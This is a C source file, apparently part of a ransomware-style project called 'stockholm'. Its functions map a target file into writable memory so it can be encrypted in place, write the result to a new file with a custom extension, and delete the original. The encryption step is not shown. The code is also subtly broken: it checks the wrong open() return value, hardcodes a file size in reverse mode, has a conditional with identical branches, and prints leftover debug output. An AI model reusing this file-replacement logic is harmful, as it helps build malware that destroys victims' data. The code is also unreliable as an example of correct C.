#include "stockholm.h"

// Function to search for a substring in binary data
bool search_binary(const char *data, size_t data_size, const char *substring)
{
    size_t substring_length = strlen(substring);
    printf("333qsduiffdildsfjqsfwodg...\n");

    for (size_t i = 0; i <= data_size - substring_length; i++)
    {
        if (memcmp(data + i, substring, substring_length) == 0)
            return 1; // Return 1 if found
    }
    return 0;
}

int fa_map_file_into_memory(const char *filename)
{
    // Open the target binary file
    int fd = open(filename, O_RDONLY);
    if (fd < 0)
        return 1;
    printf("modes:%d for %s\n", g_modes, filename);
    // If
    if (g_modes & FA_REVERSE)
    {
        printf("in reverse mode...\n");
        g_stockhlm_header.original_filesize = 4744;
    }
    else
    {
        // Determine the file size by moving the cursor till the end
        off_t res = lseek(fd, 0, SEEK_END);
        // Check that lseek didn't fail and not returning > int max
        if (res < 0 || res > 2147483647)
            return 1;
        else
            g_stockhlm_header.original_filesize = res;
        printf("res: %ld\n", res);
        // Put back the cursor at the beginning of the file
        if (lseek(fd, 0, SEEK_SET) < 0)
            return 1;
    }

    /* Map the file into memory
        - PROT_READ: read-only access
        - PROT_WRITE: write-only access
            We use both READ and WRITE since we are going to encrypt the
            mapped region directly.
        - MAP_PRIVATE: creates a private copy of the mapped data, so any
        modifications made to the mapped memory will not be visible
        to other processes mapping the same file
    */

    g_mapped_data =
        mmap(NULL, g_stockhlm_header.original_filesize, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
    if (g_mapped_data == MAP_FAILED)
    {
        close(fd);
        return 1;
    }

    close(fd); // No need to keep the fd since the file is mapped

    // // Abort if the current target already contains our signature
    // if (search_binary((char *)g_mapped_data, g_stockhlm_header.original_filesize, FA_SIGNATURE))
    //     return 1;

    return 0;
}

// Write the processed file data back to the file
int fa_write_processed_data_to_file(char *target_path)
{
    // Create a buffer to hold the full path
    char new_target_path[1024];

    // Use snprintf() to safely concatenate the strings and get the file path
    //  with our custom extension
    snprintf(
        new_target_path, sizeof(new_target_path),
        "%s%s", target_path, FA_STOCKHLM_EXT);

    // 0755: rwx for owner, rx for group and others
    int outfilefd = open(new_target_path, O_CREAT | O_RDWR | O_TRUNC, 0755);

    // Check if open() has failed
    if (outfilefd == 1)
        return 1;

    size_t filesize = (g_modes & FA_REVERSE) ? g_stockhlm_header.original_filesize : g_stockhlm_header.original_filesize;

    // Write the processed data to the outfile
    ssize_t bytes_written = write(outfilefd, g_mapped_data, filesize);
    if (bytes_written < 0)
        return 1;

    if (munmap(g_mapped_data, g_stockhlm_header.original_filesize) < 0)
        return 1;

    close(outfilefd);

    // Remove the old file
    if (remove(target_path) != 0)
        return 1;

    return 0;
}
